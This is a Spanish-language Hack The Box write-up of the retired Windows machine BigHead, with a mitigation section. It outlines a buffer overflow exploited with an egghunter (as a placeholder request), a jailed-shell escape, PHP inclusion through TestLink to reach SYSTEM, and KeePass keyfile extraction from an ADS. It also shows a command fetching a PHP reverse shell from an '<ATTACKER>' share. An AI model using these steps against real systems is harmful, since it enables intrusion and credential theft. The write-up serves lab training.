---
machine: BigHead
os: Windows
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [windows, web, buffer-overflow, keepass, privesc]
---

# BigHead — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

`dev.bighead.htb` expone un backup y el historial de GitHub revela una versión antigua con el binario del servidor. `BigheadWebSrv` tiene un desbordamiento en el handler de URL; un egghunter da shell como `nelson`. Desde ahí se escapa de `BvShell`, se encuentra TestLink y `linkto.php` permite ejecutar PHP como SYSTEM. La flag de root está en una base KeePass con keyfile escondido en un flujo ADS.

## Reconocimiento

```bash
nmap -Pn -sCV -p80,443 <IP>
```

- `80/tcp` sirve nginx 1.14.0 con la web de BigHead.
- `ffuf` con `Host: FUZZ.bighead.htb` descubre `dev.bighead.htb` y `code.bighead.htb`.
- El sitio de desarrollo permite descargar `BHWS_Backup.zip`.

## Enumeración

- El ZIP está cifrado; `zip2john` y John lo abren con una contraseña de diccionario.
- El backup contiene `bHeadSvr.dll`, `BigheadWebSvr.exe` y la configuración de nginx.
- El repositorio de GitHub conserva un commit anterior con un ZIP distinto y el binario vulnerable.

## Foothold

`BigheadWebSrv` copia la URL en un buffer fijo. Se calcula el offset, se usa un egghunter para localizar el shellcode y se envía la petición; el servicio corre como `nelson`.

```text
GET /<PADDING><EGGHUNTER><SHELLCODE> HTTP/1.1
Host: <IP>
```

## Movimiento lateral

`nelson` puede ejecutar `BvShell` como `nginx`, pero la shell está enjaulada. Un `cd` a una ruta accesible y el uso de `..` permiten salir a `C:\apps`; allí se encuentra TestLink y su `linkto.php`, que incluye un archivo controlable.

```cmd
copy \\<ATTACKER>\share\php-rev-shell.php C:\Users\nelson\AppData\Local\Temp\a.php
```

Se envía un POST a `http://localhost:5080/testlink/linkto.php` y el PHP se ejecuta como SYSTEM.

## Escalada de privilegios

La enumeración de `C:\` encuentra una base KeePass y un keyfile dentro de un flujo alternativo (`Get-Item -Stream *`). Con ambos se abre la base y se lee la flag de root.

```powershell
Get-Item -Path C:\Users\Administrator\Desktop\*.kdbx -Stream *
```

## Evidencia

- `dev.bighead.htb`, backup cifrado y commit antiguo de GitHub.
- Crash del handler de URL y shell como `nelson`.
- Escape de `BvShell` y ejecución PHP como SYSTEM.
- Base KeePass y keyfile en un ADS.

## Lecciones aprendidas

- Un repositorio Git puede conservar binarios y secretos que ya no están en la web.
- Un servicio antiguo con manejo manual de buffers sigue siendo explotable.
- Un jail de shell no es una frontera de seguridad si el binario permite rutas relativas.

## Mitigación y detección

- Retirar binarios y backups de repositorios públicos; rotar secretos.
- Usar funciones seguras de copia y compilar con mitigaciones.
- Revisar servicios internos y restringir shells enjauladas.

## Referencias

- [0xdf — BigHead](https://0xdf.gitlab.io/2019/05/04/htb-bighead.html)
- [IppSec — BigHead](https://www.youtube.com/watch?v=VBt-CmjMYiM)
- [Hack The Box — BigHead](https://app.hackthebox.com/machines/bighead)
